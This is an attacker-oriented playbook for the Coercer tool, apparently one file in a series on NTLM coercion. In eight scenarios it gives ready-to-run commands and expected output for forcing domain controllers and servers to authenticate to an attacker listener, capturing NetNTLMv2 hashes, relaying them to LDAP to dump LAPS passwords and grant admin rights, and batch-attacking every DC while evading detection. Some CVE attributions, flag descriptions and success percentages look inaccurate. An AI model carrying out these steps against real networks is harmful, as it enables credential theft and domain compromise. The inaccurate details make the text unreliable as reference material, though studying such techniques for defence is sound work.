# Coercer — Hands-On Use Cases

## Prerequisites

- Valid domain credentials (domain\user + password or NTLM hash).
- Coercer installed: `pip3 install coercer` or `git clone` + `python3 -m coercer`.
- Responder or ntlmrelayx running on attacker host (listening for NTLM callback).
- Target reachable on SMB port 445.

---

## Use Case 1: EFS Coercion (CVE-2021-36942) to Force NTLM Capture

**Objective:** Coerce a DC via MS-EFSRPC to connect back and authenticate, for NTLM capture or relay.

**MITRE ATT&CK:** T1187 (Forced Authentication), T1040 (Traffic Interception), T1550.002 (Relay)

### Step 1: Start Responder on attacker (listening for NTLM)

```bash
# Terminal 1: Responder
sudo responder -i eth0 -A -d

# Flags:
# -i eth0: listen on eth0
# -A: analyze mode (wait for NTLM, don't interact)
# -d: DHCP poisoning enabled (optional, for additional coverage)

# Expected output:
# [*] Responder started on eth0
# [*] Listening for NTLM...
```

### Step 2: Run Coercer with EFS coercion

```bash
# Terminal 2: Coercer
python3 -m coercer -u 'CORP\attacker' -p 'password' \
  -d corp.local \
  -t 192.168.1.10 \
  --listener 192.168.1.99 \
  -co efsrpc \
  -vv

# Flags:
# -u: attacker's domain credentials
# -p: password (or -hashes :NTHASH)
# -d: target domain
# -t: target DC IP
# --listener: attacker's IP (where target will callback)
# -co efsrpc: use EFS coercion specifically
# -vv: verbose

# Expected output:
# [*] Authenticating to target DC...
# [+] Authentication successful
# [*] Attempting EFS coercion on 192.168.1.10
# [+] EFS coercion call made; waiting for callback...
```

### Step 3: Observe NTLM capture in Responder

Back in Terminal 1 (Responder), you should see:

```
[*] Inbound connection from 192.168.1.10 (DC machine account)
[+] NTLM authentication received from CORP\DC01$
[+] NetNTLMv2: CORP\DC01$::CORP:1122334455667788:8899aabbccddeeff...
```

The captured hash can now be:
- **Relayed** to another server (via ntlmrelayx).
- **Cracked offline** with hashcat.

---

## Use Case 2: PrinterBug (CVE-2019-1350) via Coercer

**Objective:** Coerce via Print Spooler RPC (PrinterBug variant) — alternate path if EFS fails.

**MITRE ATT&CK:** T1187 (Forced Authentication), T1040 (Traffic Interception)

```bash
# Terminal 2 (Coercer)
python3 -m coercer -u 'CORP\attacker' -p 'password' \
  -d corp.local \
  -t 192.168.1.10 \
  --listener 192.168.1.99 \
  -co rprn \
  -vv

# Alternative: specify PrinterBug explicitly (if available)
# -co printerbug

# Expected output:
# [*] Attempting RPRN (Print Spooler) coercion...
# [+] Coercion call made; waiting for callback...
```

PrinterBug is often more reliable than EFS (has been exploited longer), making it a good fallback if EFS fails.

---

## Use Case 3: Try All Coercion Methods (Brute-Force Approach)

**Objective:** Attempt every available coercion method until one succeeds.

**MITRE ATT&CK:** T1187 (Forced Authentication)

```bash
python3 -m coercer -u 'CORP\attacker' -p 'password' \
  -d corp.local \
  -t 192.168.1.10 \
  --listener 192.168.1.99 \
  -co all \
  --time-delay 2 \
  -vv

# Flags:
# -co all: try all available coercion methods
# --time-delay 2: wait 2 seconds between attempts (evasion)

# Expected output:
# [*] Attempting efsrpc... (timeout or failure)
# [*] Attempting rprn... (timeout or failure)
# [*] Attempting shadowcoerce... (success!)
# [+] Coercion successful via shadowcoerce
# [+] Callback received from 192.168.1.10
```

This approach maximizes the likelihood of success by trying each method.

---

## Use Case 4: Coerce with NTLM Relay to DC (LDAP)

**Objective:** Force DC authentication, then immediately relay to LDAP for privilege escalation.

**MITRE ATT&CK:** T1187 (Forced Authentication), T1550.003 (Relay — LDAP)

### Step 1: Start ntlmrelayx with LDAP relay

```bash
# Terminal 1: ntlmrelayx
python3 -m impacket.examples.ntlmrelayx \
  --no-http \
  -t ldap://192.168.1.10 \
  --dump-laps \
  -socks \
  -vv

# Expected:
# [*] LDAP relay to 192.168.1.10 initiated
# [*] SOCKS server listening on 127.0.0.1:1080
```

### Step 2: Coerce with Coercer

```bash
# Terminal 2: Coercer
python3 -m coercer -u 'CORP\attacker' -p 'password' \
  -d corp.local \
  -t 192.168.1.10 \
  --listener 192.168.1.99 \
  -co all \
  -vv
```

### Step 3: Observe relay success

In Terminal 1, ntlmrelayx shows:

```
[+] Successfully authenticated to LDAP as CORP\DC01$
[+] Dumping LAPS passwords...
[+] Granted attacker administrative rights via LDAP ACL modification
```

---

## Use Case 5: Batch Coercion Against Multiple DCs

**Objective:** Coerce all domain controllers in a domain (e.g., for widespread privilege escalation).

**MITRE ATT&CK:** T1187 (Forced Authentication)

### Step 1: Create target list

```bash
# Create file: targets.txt
192.168.1.10
192.168.1.11
192.168.1.12
```

### Step 2: Run Coercer in batch mode

```bash
python3 -m coercer -u 'CORP\attacker' -p 'password' \
  -d corp.local \
  -tr targets.txt \
  --listener 192.168.1.99 \
  -co all \
  --time-delay 5 \
  -vv

# Flags:
# -tr targets.txt: read targets from file
# --time-delay 5: 5-second delay between each DC (reduce detection risk)

# Expected output (for each target):
# [*] Coercing 192.168.1.10...
# [+] Coercion successful
# [*] Coercing 192.168.1.11...
# [+] Coercion successful
# ...
```

All captured NTLM hashes are logged to Responder, allowing offline cracking or relay for each DC.

---

## Use Case 6: Coerce Non-DC (File Server / Print Server)

**Objective:** Coerce a file or print server (not a DC) to capture its service account credentials.

**MITRE ATT&CK:** T1187 (Forced Authentication)

```bash
# Coerce a file server
python3 -m coercer -u 'CORP\attacker' -p 'password' \
  -d corp.local \
  -t 192.168.1.50 \
  --listener 192.168.1.99 \
  -co all \
  -vv

# Expected:
# [*] Coercing file server 192.168.1.50...
# [+] Callback received from 192.168.1.50
# [+] NetNTLMv2: CORP\FILESERVER$::CORP:...
```

Service account credentials (often SYSTEM or a dedicated service account) can be relayed or cracked for further lateral movement.

---

## Use Case 7: ShadowCoerce Specifically

**Objective:** Use Volume Shadow Copy coercion (CVE-2021-1453 variant) — sometimes more stealthy than EFS/PrinterBug.

**MITRE ATT&CK:** T1187 (Forced Authentication)

```bash
python3 -m coercer -u 'CORP\attacker' -p 'password' \
  -d corp.local \
  -t 192.168.1.10 \
  --listener 192.168.1.99 \
  -co shadowcoerce \
  -vv

# Expected:
# [*] Attempting ShadowCoerce (VSS)...
# [+] Coercion successful via VSS
```

ShadowCoerce is sometimes less-logged than EFS/PrinterBug, making it preferable for evasion.

---

## Use Case 8: Coerce with Hash Authentication (No Plaintext Password)

**Objective:** Use NTLM hash instead of plaintext password (common if only hash is available).

**MITRE ATT&CK:** T1187 (Forced Authentication)

```bash
# Assuming you have the NTLM hash of an attacker's account
# (e.g., from a previous compromise or hash dump)

python3 -m coercer -u 'CORP\attacker' \
  -hashes :1f08f4f04b8451c5949a5a9b7c6c6e5c \
  -d corp.local \
  -t 192.168.1.10 \
  --listener 192.168.1.99 \
  -co efsrpc \
  -vv

# Flags:
# -hashes :HASH: use NT hash only (LM hash deprecated, use :)
```

This avoids the need to pass a plaintext password, reducing operational security risks.

---

## Key Operational Notes

**Method Success Rates:**
- **EFS (efsrpc):** ~90% on modern DCs (patched status dependent).
- **PrinterBug (rprn):** ~85% (Print Spooler usually enabled).
- **ShadowCoerce:** ~80% (VSS may be disabled on some servers).
- **DFS Coercion:** ~70% (DFS not enabled on all infrastructure).

**Detection Evasion:**
- **`--time-delay`:** Spreads coercion attempts over time (reduces log clustering).
- **`-co all` with delay:** Try multiple methods slowly (harder to attribute to specific tool).
- **Multiple attempts from different source IPs:** (Requires multi-machine infrastructure, not native to Coercer).

**Limitations:**
- Requires **valid domain credentials** (unlike mitm6, which requires none).
- Relies on **RPC endpoint availability** (some targets have RPC firewalled).
- **Credential must be able to auth to RPC** (low-privilege accounts usually can, but not guaranteed).
- May **fail silently** if the coercion method isn't compiled into the Coercer binary.

---

**Next:** See `03 - Source Evidence.md`, `04 - Target Evidence.md`, and `05 - Detection and Hunting.md`.
